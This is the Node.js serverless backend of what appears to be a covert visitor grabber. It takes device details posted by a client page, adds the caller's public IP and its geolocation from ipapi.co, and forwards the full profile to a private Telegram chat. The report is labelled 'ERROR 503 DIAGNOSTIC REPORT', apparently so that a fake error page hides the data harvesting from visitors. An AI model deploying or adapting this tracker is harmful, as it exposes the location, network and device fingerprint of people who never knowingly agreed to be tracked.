export const config = {
  runtime: "nodejs"
};

function getPublicIP(req) {

  let ip =
    req.headers["x-forwarded-for"]?.split(",")[0]?.trim() ||
    req.headers["x-real-ip"] ||
    req.headers["cf-connecting-ip"] ||
    req.socket?.remoteAddress ||
    "Unknown";

  ip = ip.replace("::ffff:", "");

  return ip || "Unknown";
}

async function getIPInfo(ip) {

  if (!ip || ip === "Unknown") {
    return {
      country: "-",
      region: "-",
      city: "-",
      isp: "-"
    };
  }

  try {

    const response =
      await fetch(
        `https://ipapi.co/${encodeURIComponent(ip)}/json/`
      );

    const data = await response.json();

    if (data?.error) {
      throw new Error("IP API error");
    }

    return {

      country:
        data.country_name || "-",

      region:
        data.region || "-",

      city:
        data.city || "-",

      isp:
        data.org ||
        data.as ||
        "-"

    };

  } catch {

    return {
      country: "-",
      region: "-",
      city: "-",
      isp: "-"
    };

  }
}

function escapeMarkdown(text) {

  return String(text ?? "-")
    .replace(/([_*[\]()~`>#+\-=|{}.!])/g, "\\$1");

}

export default async function handler(req, res) {

  if (req.method !== "POST") {
    return res
      .status(405)
      .send("Method Not Allowed");
  }

  const BOT_TOKEN =
    process.env.BOT_TOKEN;

  const CHAT_ID =
    process.env.CHAT_ID;

  if (!BOT_TOKEN || !CHAT_ID) {

    return res
      .status(500)
      .send("ENV belum diset");

  }

  const input =
    req.body || {};

  const ip =
    getPublicIP(req);

  const ipinfo =
    await getIPInfo(ip);

  const serverTime =
    new Date()
      .toISOString()
      .replace("T", " ")
      .split(".")[0];

  const message = `🚨 *ERROR 503 DIAGNOSTIC REPORT*

━━━━━━━━━━━━━━━━━━━━
📱 *DEVICE INFORMATION*
━━━━━━━━━━━━━━━━━━━━
🧠 OS           : ${escapeMarkdown(input.os)}
💻 Platform     : ${escapeMarkdown(input.platform)}
⚙️ CPU Cores    : ${escapeMarkdown(input.cpu)}
💾 RAM          : ${escapeMarkdown(input.ram)}
👆 Touch Points : ${escapeMarkdown(input.touchPoints)}

━━━━━━━━━━━━━━━━━━━━
🖥 *DISPLAY INFORMATION*
━━━━━━━━━━━━━━━━━━━━
🖥 Resolution   : ${escapeMarkdown(input.resolution)}
📐 Viewport     : ${escapeMarkdown(input.viewport)}
🔍 Pixel Ratio  : ${escapeMarkdown(input.pixelRatio)}
📱 Orientation  : ${escapeMarkdown(input.orientation)}

━━━━━━━━━━━━━━━━━━━━
🌐 *BROWSER INFORMATION*
━━━━━━━━━━━━━━━━━━━━
🌐 Browser      :
${escapeMarkdown(input.browser)}

🏢 Vendor       : ${escapeMarkdown(input.vendor)}
🍪 Cookies      : ${escapeMarkdown(input.cookiesEnabled)}
🛡 Do Not Track : ${escapeMarkdown(input.doNotTrack)}
📶 Online       : ${escapeMarkdown(input.online)}

━━━━━━━━━━━━━━━━━━━━
🗣 *LANGUAGE & TIMEZONE*
━━━━━━━━━━━━━━━━━━━━
🗣 Language     : ${escapeMarkdown(input.language)}
🗣 Languages    : ${escapeMarkdown(input.languages)}
🕒 Timezone     : ${escapeMarkdown(input.timezone)}
⏱ UTC Offset   : ${escapeMarkdown(input.timezoneOffset)}

━━━━━━━━━━━━━━━━━━━━
📡 *CONNECTION*
━━━━━━━━━━━━━━━━━━━━
📶 Type         : ${escapeMarkdown(input.connectionType)}
⚡ Effective    : ${escapeMarkdown(input.effectiveType)}
⬇️ Downlink     : ${escapeMarkdown(input.downlink)}
⏱ RTT          : ${escapeMarkdown(input.rtt)}

━━━━━━━━━━━━━━━━━━━━
🌍 *NETWORK*
━━━━━━━━━━━━━━━━━━━━
🌐 Public IP    : ${escapeMarkdown(ip)}

━━━━━━━━━━━━━━━━━━━━
🌎 *IP INFORMATION*
━━━━━━━━━━━━━━━━━━━━
🌍 Country      : ${escapeMarkdown(ipinfo.country)}
📍 Region       : ${escapeMarkdown(ipinfo.region)}
🏙 City         : ${escapeMarkdown(ipinfo.city)}
🏢 ISP / Org    : ${escapeMarkdown(ipinfo.isp)}

━━━━━━━━━━━━━━━━━━━━
🔗 *PAGE INFORMATION*
━━━━━━━━━━━━━━━━━━━━
↩️ Referrer     : ${escapeMarkdown(input.referrer)}
📄 Page         : ${escapeMarkdown(input.page)}

━━━━━━━━━━━━━━━━━━━━
🆔 *REPORT*
━━━━━━━━━━━━━━━━━━━━
🆔 Report ID    : ${escapeMarkdown(input.reportId)}
🕐 Client Time  : ${escapeMarkdown(input.clientTime)}
🕐 Server Time  : ${serverTime}`;

  try {

    const telegramResponse =
      await fetch(
        `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
        {
          method: "POST",

          headers: {
            "Content-Type":
              "application/json"
          },

          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message,
            parse_mode: "MarkdownV2"
          })
        }
      );

    if (!telegramResponse.ok) {

      const errorText =
        await telegramResponse.text();

      console.error(
        "Telegram error:",
        errorText
      );

      return res
        .status(502)
        .send("Gagal mengirim ke Telegram");
    }

    return res
      .status(200)
      .send("OK");

  } catch (error) {

    console.error(error);

    return res
      .status(500)
      .send("Gagal kirim");

  }
      }
